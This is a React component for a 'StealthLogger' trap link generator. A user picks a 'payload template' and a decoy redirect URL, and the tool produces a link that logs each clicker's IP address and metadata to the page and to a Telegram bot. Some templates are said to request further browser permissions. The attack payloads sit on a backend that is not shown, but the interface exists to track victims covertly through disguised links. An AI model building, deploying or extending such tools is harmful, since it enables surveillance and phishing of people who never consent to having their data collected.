import React, { useState, useEffect } from 'react';
import { ShieldAlert, Link, Copy, Check, ExternalLink, Info, Zap } from 'lucide-react';

export default function StealthLogger() {
  const [templates, setTemplates] = useState<any[]>([]);
  const [selectedTmpl, setSelectedTmpl] = useState('');
  const [redirectUrl, setRedirectUrl] = useState('https://google.com');
  const [generatedLink, setGeneratedLink] = useState('');
  const [copied, setCopied] = useState(false);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    fetch('/api/templates')
      .then(res => res.json())
      .then(data => {
        setTemplates(data);
        if (data.length > 0) setSelectedTmpl(data[0].id);
      })
      .catch(console.error);
  }, []);

  const handleCreate = async () => {
    setLoading(true);
    try {
      const res = await fetch('/api/create-trap', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ tmplId: selectedTmpl, redirect: redirectUrl })
      });
      const data = await res.json();
      if (data.url) {
        setGeneratedLink(window.location.origin + data.url);
      }
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  const copyToClipboard = () => {
    navigator.clipboard.writeText(generatedLink);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="flex flex-col h-full bg-slate-950 text-[#38bdf8]">
      <div className="p-6 border-b border-[#38bdf8]/20 bg-[#38bdf8]/5">
        <h2 className="text-xl font-bold flex items-center mb-2 tracking-tighter">
          <ShieldAlert className="w-5 h-5 mr-3 text-[#38bdf8]" /> TRAP LINK GENERATOR
        </h2>
        <p className="text-xs text-[#38bdf8]/60 uppercase tracking-widest">Create custom links to log interactions and metadata.</p>
      </div>

      <div className="p-6 overflow-y-auto space-y-8">
        <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
          {/* Configuration */}
          <div className="space-y-6">
            <h3 className="font-display text-[10px] font-bold text-[#38bdf8]/40 uppercase tracking-[0.3em] mb-4 border-b border-[#38bdf8]/10 pb-2">CONFIGURATION</h3>
            
            <div className="space-y-4">
              <div>
                <label className="block text-[10px] font-bold text-[#38bdf8]/60 mb-2 uppercase tracking-widest">Select_Payload_Template</label>
                <select 
                  value={selectedTmpl}
                  onChange={e => setSelectedTmpl(e.target.value)}
                  className="w-full bg-slate-950 border border-[#38bdf8]/20 text-[#38bdf8] rounded px-4 py-2.5 focus:outline-none focus:border-[#38bdf8]/60 font-display text-sm appearance-none cursor-pointer hover:bg-[#38bdf8]/5"
                >
                  {templates.map(t => (
                    <option key={t.id} value={t.id}>{t.name}</option>
                  ))}
                </select>
              </div>

              <div>
                <label className="block text-[10px] font-bold text-[#38bdf8]/60 mb-2 uppercase tracking-widest">Final_Redirect_URL</label>
                <input 
                  type="text" 
                  value={redirectUrl}
                  onChange={e => setRedirectUrl(e.target.value)}
                  placeholder="https://google.com"
                  className="w-full bg-slate-950 border border-[#38bdf8]/20 text-[#38bdf8] rounded px-4 py-2.5 focus:outline-none focus:border-[#38bdf8]/60 font-display text-sm placeholder:text-[#38bdf8]/20"
                />
              </div>

              <button
                onClick={handleCreate}
                disabled={loading}
                className="w-full py-4 bg-[#38bdf8] hover:bg-[#38bdf8]/80 text-black font-bold text-sm uppercase tracking-[0.2em] transition-all active:scale-95 flex items-center justify-center space-x-3 shadow-[0_0_20px_rgba(0,255,0,0.1)]"
              >
                <Zap className={`w-4 h-4 ${loading ? 'animate-spin' : ''}`} />
                <span>{loading ? 'GENERATING...' : 'GENERATE_LINK'}</span>
              </button>
            </div>
          </div>

          {/* Details & Output */}
          <div className="space-y-6">
            <h3 className="font-display text-[10px] font-bold text-[#38bdf8]/40 uppercase tracking-[0.3em] mb-4 border-b border-[#38bdf8]/10 pb-2">OUTPUT_STREAMS</h3>
            
            {generatedLink ? (
              <div className="space-y-4 animate-in zoom-in-95 duration-300">
                <div className="p-4 bg-[#38bdf8]/10 border border-[#38bdf8]/40 rounded relative group">
                  <div className="text-[9px] font-bold text-[#38bdf8] mb-2 tracking-widest uppercase">GENERATED_URL:</div>
                  <div className="font-display text-xs break-all pr-12 text-white font-bold select-all">{generatedLink}</div>
                  <button 
                    onClick={copyToClipboard}
                    className="absolute right-4 top-1/2 -translate-y-1/2 p-2 hover:bg-[#38bdf8]/20 text-[#38bdf8] rounded transition-all"
                  >
                    {copied ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                  </button>
                </div>
                
                <div className="flex space-x-2">
                  <a 
                    href={generatedLink} 
                    target="_blank" 
                    rel="noopener noreferrer"
                    className="flex-1 flex items-center justify-center space-x-2 border border-[#38bdf8]/20 py-2.5 text-[10px] font-bold uppercase tracking-widest hover:bg-[#38bdf8]/5 transition-all text-[#38bdf8]/80"
                  >
                    <ExternalLink className="w-3 h-3" />
                    <span>Test_Link</span>
                  </a>
                  <button 
                    onClick={() => setGeneratedLink('')}
                    className="flex-1 py-2.5 text-[10px] font-bold uppercase tracking-widest border border-red-500/20 hover:bg-red-500/5 text-red-500/60 transition-all"
                  >
                    Reset_Link
                  </button>
                </div>
              </div>
            ) : (
              <div className="p-8 border border-dashed border-[#38bdf8]/10 flex flex-col items-center justify-center text-center opacity-30">
                <Link className="w-8 h-8 mb-4 animate-pulse" />
                <span className="text-[10px] font-bold uppercase tracking-widest">Awaiting Link Generation Parameter Input</span>
              </div>
            )}

            <div className="p-4 bg-slate-950 border border-[#38bdf8]/5 text-[10px] space-y-3 leading-relaxed">
              <div className="flex items-start space-x-3">
                <Info className="w-4 h-4 text-[#38bdf8]/40 mt-0.5 shrink-0" />
                <p className="text-[#38bdf8]/40 uppercase tracking-tight font-bold">
                  All captured data (IPs, Basic Metadata) will be logged here and to your configured Telegram Bot.
                </p>
              </div>
              <div className="flex items-start space-x-3">
                <Info className="w-4 h-4 text-[#38bdf8]/40 mt-0.5 shrink-0" />
                <p className="text-[#38bdf8]/40 uppercase tracking-tight font-bold">
                  Certain templates require additional user browser permissions to function.
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
